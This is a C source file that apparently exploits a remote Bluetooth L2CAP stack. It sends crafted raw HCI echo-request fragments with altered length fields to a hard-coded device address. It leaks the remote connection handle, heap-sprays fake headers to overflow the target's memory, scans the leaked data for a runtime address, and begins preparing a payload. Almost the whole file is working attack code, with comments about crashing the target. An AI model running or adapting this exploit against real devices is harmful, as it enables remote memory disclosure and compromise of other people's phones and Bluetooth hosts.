#include <sys/time.h>
#include <sys/types.h>
#include <sys/select.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>
#include <bluetooth/l2cap.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <unistd.h>

#define ECHO_REQUEST 0x08
#define ECHO_RESPONSE 0x09

#define HANDLE_MASK 0x0FFF
#define START_PACKET_BOUNDARY 2
#define CONTINUATION_PACKET_BOUNDARY 1

#define l2_hci_packet_header_len 13
#define MSG_HC_TO_STACK_HCI_ACL 0x1100
int maxfd = 2;

int wsocket(int __domain, int __type, int __protocol)
{
    int fd = socket(__domain, __type, __protocol);
    if (maxfd < fd)
    {
        maxfd = fd;
    }
    return fd;
}

typedef struct fakedata
{
    uint16_t fake_handle;
    uint16_t fake_len_acl;
    uint16_t fake_len_l2cap;
    uint16_t fake_cid;
    //acl_hdr
    uint8_t fake_command;
    uint8_t fake_ident;
    uint16_t fake_len_data;
} __attribute__((packed)) fakedata;

typedef struct l2_hci_packet
{
    unsigned char pk; //packet type  1 hci command 2 acl 4 event 
    uint16_t handle; // handle 
    uint16_t len_acl; // length of reminder
    // hci_hdr
    uint16_t len_l2cap; // length of reminder
    uint16_t cid;//channel id
    //acl_hdr
    uint8_t command;//l2 command  such 8 is echo request
    uint8_t ident;//command ident 
    uint16_t len_data;//length of data
    //l2cap_hdr
    uint8_t data[];
} __attribute__((packed)) l2_hci_packet;

typedef struct l2_command_packet
{
    uint8_t command;
    uint8_t ident;
    uint16_t len;
    uint8_t data[];
} __attribute__((packed)) l2_command_packet;

l2_hci_packet *create_l2_echo_hci(uint16_t handle, uint8_t ident, int datalen, int continuation_flags, int lenadjust)
{
    l2_hci_packet *packet = calloc(1, lenadjust + datalen + l2_hci_packet_header_len);
    if (!packet)
    {
        exit(0);
        return NULL;
    }
    packet->pk = 2;
    packet->handle = (handle & HANDLE_MASK) | (continuation_flags << 12);
    packet->len_acl = datalen + 8;
    //hci
    packet->len_l2cap = datalen + 4 + lenadjust;
    packet->cid = htobs(0x0001);
    //acl
    packet->command = ECHO_REQUEST;
    packet->ident = ident;
    packet->len_data = datalen + lenadjust;
    //l2cap
    return packet;
}

void packet_free(l2_hci_packet *packet)
{
    packet = ((long)packet) & (~0xf);
    free(packet);
}

l2_command_packet *recv_l2_echo_select(int sock, int ident)
{
    struct timeval timeout = {1, 0};
    fd_set fds;
    FD_ZERO(&fds);
    FD_SET(sock, &fds);
    if (select(maxfd + 1, &fds, NULL, NULL, &timeout))
    {

        char buf[0x1000] = {};
        int n = read(sock, buf, 0x1000);
        if (n < 0)
        {
            return NULL;
        }
        l2_command_packet *packet = calloc(1, n);
        if (!packet)
        {
            return NULL;
        }
        memcpy(packet, buf, n);
        printf("recv a l2_packet command is %d length is %d \n", packet->command, packet->len);

        if (packet->command != ECHO_RESPONSE)
        {
            puts("echo resp");
            return NULL;
        }
        puts("is a l2cap echo resp");
        printf("            ");
        for (size_t i = 0; i < packet->len; i++)
        {
            printf("%02x ", packet->data[i]);
            if ((i % 0x10) == (0xf - 4))
            {
                puts("");
            }
        }
        puts("");

        return packet;
    }
    return NULL;
}

l2_command_packet *recv_l2_echo(int sock, int ident)
{
    char buf[0x1000] = {};
    int n = read(sock, buf, 0x1000);
    if (n < 0)
    {
        return NULL;
    }
    l2_command_packet *packet = calloc(1, n);
    if (!packet)
    {
        return NULL;
    }
    memcpy(packet, buf, n);
    printf("recv a l2_packet command is %d length is %d \n", packet->command, packet->len);

    if (packet->command != ECHO_RESPONSE)
    {
        puts("echo resp");
        return NULL;
    }
    puts("is a l2cap echo resp");
    printf("            ");
    for (size_t i = 0; i < packet->len; i++)
    {
        printf("%02x ", packet->data[i]);
        if ((i % 0x10) == (0xf - 4))
        {
            puts("");
        }
    }
    puts("");

    return packet;
}

int send_l2_echo(l2_hci_packet *packet, int sock, int length)
{
    struct iovec iv;
    iv.iov_base = packet;
    iv.iov_len = length;
    if (writev(sock, &iv, 1) < 0)
    {
        puts("write error");
        exit(-1);
        return -1;
    }
    return 0;
}

int main(int argc, char **argv)
{
    setbuf(stdin, 0);
    setbuf(stdout, 0);
    char mac_addr[] = "9c:2e:a1:53:bf:16";
    int hci_device_id = hci_get_route(NULL);
    int hci_socket = hci_open_dev(hci_device_id);
    int opt = 1;
    char *runtime_ptr = NULL;
    // char filter[] = "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00";
    //setsockopt(hci_socket, SOL_HCI, HCI_DATA_DIR, &opt, sizeof(opt));
    //setsockopt(hci_socket, SOL_HCI, HCI_FILTER, filter, sizeof(filter));
    struct sockaddr_hci addr = {};
    addr.hci_family = AF_BLUETOOTH;
    addr.hci_dev = 0; // hci0
    printf("get hci socket %d\n", hci_socket);

    int l2_sock = wsocket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP);
    if (bind(l2_sock, &addr, sizeof(addr)) < 0)
    {
        puts("bind error2");
        exit(0);
    }
    struct sockaddr_l2 daddr;
    daddr.l2_family = AF_BLUETOOTH;
    str2ba(mac_addr, &daddr.l2_bdaddr);
    if (connect(l2_sock, (struct sockaddr *)&daddr, sizeof(daddr)) < 0)
    {
        puts("connect error");
        exit(0);
    }
    //getchar();
    struct l2cap_conninfo l2_conninfo;
    socklen_t l2_conninfolen = sizeof(l2_conninfo);
    getsockopt(l2_sock, SOL_L2CAP, L2CAP_CONNINFO, &l2_conninfo, &l2_conninfolen);
    printf("get handle %d\n", l2_conninfo.hci_handle);
    int handle = l2_conninfo.hci_handle;
    //leak remote handle   data len > 0x40 to avoid change xx_hdr
    l2_hci_packet *packet = create_l2_echo_hci(handle, 0xaa, 0x50, 0, 2);
    memset(packet->data, 0x1, packet->len_data);
    send_l2_echo(packet, hci_socket, packet->len_data + l2_hci_packet_header_len);
    packet_free(packet);

    packet = create_l2_echo_hci(handle, 0xab, 0x50, 1, 0);
    memset(packet->data, 0x1, packet->len_data);
    send_l2_echo(packet, hci_socket, packet->len_data + l2_hci_packet_header_len);
    packet_free(packet);

    l2_command_packet *l2packet = recv_l2_echo(l2_sock, 0xaa);
    while (!l2packet)
    {
        l2packet = recv_l2_echo(l2_sock, 0xaa);
    }

    uint16_t remotehandle = (*((uint16_t *)(&l2packet->data[l2packet->len - 6]))) & 0xfff;
    printf("remote handle %d\n", remotehandle);

    fakedata fake = {};
    {
        fake.fake_cid = 0x1;
        fake.fake_command = ECHO_REQUEST;
        fake.fake_handle = remotehandle;
        fake.fake_ident = 0x66;
        fake.fake_len_acl = 0x280;
        fake.fake_len_l2cap = fake.fake_len_acl - 4;
        fake.fake_len_data = fake.fake_len_l2cap - 4;
    }
    int sprayn = 4;
    int ok = 0;
    int i = 0;
    // heap spary  https://www.anquanke.com/post/id/85982  size is same
    while (!ok)
    {
        printf("overflow %d\n", i);
        i++;
        for (size_t j = 0; j < sprayn; j++)
        {
            packet = create_l2_echo_hci(handle, 0x67 + i * sprayn + j, 0x20 + 0x2 + 6 + 2 + 8 + 4, 0, 0);
            memset(packet->data, 'a', 6);
            memcpy(packet->data + 6, &fake, sizeof(fake));
            memset(packet->data + 6 + sizeof(fake), 0xff, packet->len_data - 6 - sizeof(fake));
            send_l2_echo(packet, hci_socket, packet->len_data + l2_hci_packet_header_len);
            packet_free(packet);

            l2packet = recv_l2_echo(l2_sock, 0x67 + i * sprayn);
            while (!l2packet)
            {
                l2packet = recv_l2_echo(l2_sock, 0x67 + i * sprayn);
            }
        }

        printf("heap spray\n");
        packet = create_l2_echo_hci(handle, 0x67 + sprayn + i * sprayn, 0x20 + 0x2 + 6 + 2 + 8 + 4, 0, 2);
        memset(packet->data, 0x1, packet->len_data);
        send_l2_echo(packet, hci_socket, packet->len_data + l2_hci_packet_header_len);
        packet_free(packet);

        packet = create_l2_echo_hci(handle, 0x67 + sprayn + i * sprayn + 1, 0x20 + 0x2 + 6 + 2 + 8 + 4, 1, 0);
        memset(packet->data, 0x2, packet->len_data);
        send_l2_echo(packet, hci_socket, packet->len_data + l2_hci_packet_header_len);
        packet_free(packet);

        l2packet = recv_l2_echo_select(l2_sock, 0x66);
        int times = 2;
        while (!l2packet)
        {
            printf("try %d\n", times);
            times++;
            if (times > 3)
            {
                break;
            }
            l2packet = recv_l2_echo_select(l2_sock, 0x66);
        }

        if (l2packet && l2packet->len > 0x100)
        {
            char succ = 0;
            printf("leak success, checking\n");
            unsigned long *ptr = (unsigned long *)&l2packet->data[0x24];
            for (size_t i = 0; i < (fake.fake_len_data - 0x24) / 8; i++)
            {
                printf("%016lx ", ptr[i]);
                if (i % 4 == 3)
                {
                    puts("");
                }
                if (!succ && ((ptr[i] & 0xfff) == 0x898))
                {
                    runtime_ptr = ptr[i];
                    succ = 1;
                }
            }
            puts("");
            if (succ)
            {
                break;
            }
            // ok = 1;
        }
        // l2packet  = recv_l2_echo(l2_sock,0xaa);
        // while(!l2packet){
        //     l2packet = recv_l2_echo(l2_sock,0xaa);
        // }
    }
    packet_free(l2packet);
    printf("leak address success\n");
    printf("address = %p\n", runtime_ptr);
    // crash it

    // leak more data
    // bt_hdr 8 event len offset layer
    // hci_hdr 4 handle len
    // acl_hdr 4 len cid
    // l2cap hdr  command ident len
    // data    8+4+4

    // for (size_t i = 0; i < 0x50; i++)
    // {
    //     packet->ident = 0x8e + i;
    //     for (size_t j = 0; j < packet->len_data; j++)
    //     {
    //         packet->data[j] = i;
    //     }
    //     send_l2_echo(packet,hci_socket,packet->len_data+l2_hci_packet_header_len);
    //     l2packet  = recv_l2_echo(l2_sock,packet->ident);
    //     while(!l2packet){
    //         l2packet = recv_l2_echo(l2_sock,packet->ident);
    //     }
    //     //sleep(1);
    // }
    //prepare payload len
    int payloadlen = 630;
    int o = 0;
    while (1)
    {
        packet = create_l2_echo_hci(handle, (0x36 + o * 3) % 0xf0, payloadlen, 0, 2);
        memset(packet->data, 0x1, packet->len_data);
        send_l2_echo(packet, hci_socket, packet->len_data + l2_hci_packet_header_len);
        packet_free(packet);

        packet = create_l2_echo_hci(handle, (0x37 + o * 3) % 0xf0, 2, 1, 0);
        memset(packet->data, 0x2, packet->len_data);
        send_l2_echo(packet, hci_socket, packet->len_data + l2_hci_packet_header_len);
        packet_free(packet);

        l2packet = recv_l2_echo_select(l2_sock, (0x36 + o * 3) % 0xf0);
        int times = 2;
        while (!l2packet)
        {
            printf("try %d\n", times);
            times++;
            if (times > 3)
            {
                break;
            }
            l2packet = recv_l2_echo_select(l2_sock, (0x36 + o * 3) % 0xf0);
        }
        
        l2packet = recv_l2_echo_select(l2_sock, (0x38 + o * 3) % 0xf0);
        getchar();
    }

    

    close(l2_sock);
    close(hci_socket);
}